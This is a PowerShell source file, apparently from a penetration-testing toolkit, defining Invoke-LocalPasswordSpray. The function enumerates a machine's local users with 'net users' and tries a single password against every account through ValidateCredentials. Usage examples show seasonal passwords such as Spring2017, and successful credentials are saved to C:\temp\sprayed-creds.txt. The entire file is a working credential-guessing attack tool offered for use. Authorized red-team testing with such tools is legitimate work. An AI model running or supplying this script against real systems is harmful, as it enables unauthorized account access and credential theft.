function Invoke-LocalPasswordSpray{
<#
.SYNOPSIS

This module performs a password spray attack against the local users of a system. By default it will automatically generate the userlist from the system. Be careful not to lockout any accounts.

PivotAll Function: Invoke-LocalPasswordSpray
Author: Beau Bullock (@dafthack) 
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

This module performs a password spray attack against the local users of a system. By default it will automatically generate the userlist from the system. Be careful not to lockout any accounts.

.PARAMETER UserList

Optional UserList parameter. This will be generated automatically if not specified

.PARAMETER Password

A single password that will be used to perform the password spray

.EXAMPLE

C:\PS> Invoke-LocalPasswordSpray -Password Spring2017

Description
-----------
This command will automatically generate a list of users from the local system and attempt to authenticate using each username and a password of Spring2017.

.EXAMPLE

C:\PS> Invoke-LocalPasswordSpray -UserList users.txt -Password Winter2017

Description
-----------
This command will use the userlist at users.txt and try to authenticate using the password Winter2017 for each user.


#>
Param(
 [Parameter(Position = 1, Mandatory = $false)]
 [string]
 $UserList = "C:\temp\UserList.txt",

 [Parameter(Position = 2, Mandatory = $false)]
 [string]
 $Password

)

$UserListExists = Test-Path "$UserList"
If ($UserListExists -eq $False) {
    #Create a list of all local users if not specified
Write-Host "##### Making a list of all local users  #####"
$mkdir = "cmd.exe /C mkdir C:\temp\"
Invoke-Expression -Command:$mkdir
$net_users = "cmd.exe /C net users > C:\temp\raw-users.txt"
Invoke-Expression -Command:$net_users

    # Moving Net Users output to one username per line
$stripped_users = (Get-Content -Encoding Ascii "C:\temp\raw-users.txt" | select -Skip 4  | Where-Object {$_ -notmatch 'The command completed successfully.'}) 
$trimmed = $stripped_users.Trim()
$one_user_per_line = $trimmed -Replace '\s+',"`r`n"
$one_user_per_line | Out-File -Encoding ascii C:\temp\UserList.txt

$del_raw = "cmd.exe /C del C:\temp\raw-users.txt"
Invoke-Expression -Command:$del_raw
}

Write-Host "[*] Using $UserList as userlist to spray with"
If (!$DomainController){$get_dc = "cmd.exe /C echo %logonserver% 2>&1"
$DomainController = Invoke-Expression -Command:$get_dc
}

$time = Get-Date
Write-Host -ForegroundColor Yellow "[*] Password spraying has started. Current time is $($time.ToShortTimeString())"
Write-Host "[*] This might take a while depending on the total number of users"
$curr_user = 0
$Users = Get-Content $UserList
$count = $Users.count
Add-Type -assemblyname system.DirectoryServices.accountmanagement 
$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)

ForEach($User in $Users){
$Auth_check = $DS.ValidateCredentials($User, $Password) 
    If ($Auth_check -eq $true)
    {
    Add-Content C:\temp\sprayed-creds.txt $User`:$Password
    Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
    }
    $curr_user+=1 
    Write-Host -nonewline "$curr_user of $count users tested`r"
    }
Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to C:\temp\sprayed-creds.txt"
}